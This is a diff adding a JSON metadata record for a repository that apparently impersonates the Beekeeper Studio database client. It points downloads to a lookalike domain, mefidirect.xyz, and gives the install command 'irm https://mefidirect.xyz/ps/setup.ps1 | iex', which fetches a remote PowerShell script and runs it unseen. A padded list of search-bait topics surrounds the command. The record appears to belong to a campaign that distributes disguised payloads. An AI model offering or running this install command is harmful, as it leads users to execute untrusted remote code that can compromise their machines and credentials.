@@ -1,0 +1,29 @@
+{
+  "repo": "beekeeper-studio-sql-explorer",
+  "product": "Beekeeper Studio SQL Explorer",
+  "kind": "database",
+  "install_type": "download",
+  "download_url": "https://beekeeper-studio.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "database",
+  "topics": [
+    "beekeeper-studio-pack",
+    "beekeeper-studio-utility",
+    "beekeeper-studio-database-client",
+    "beekeeper-studio-desktop-windows",
+    "beekeeper-studio-connection-fix",
+    "beekeeper-studio-windows-guide",
+    "beekeeper-studio-sql-workbench",
+    "beekeeper-studio-native-app",
+    "beekeeper-studio-install-steps",
+    "beekeeper-studio-steps-2026",
+    "beekeeper-studio-package",
+    "windows-tools",
+    "desktop-tools",
+    "setup-guide",
+    "sql-tools"
+  ]
+}
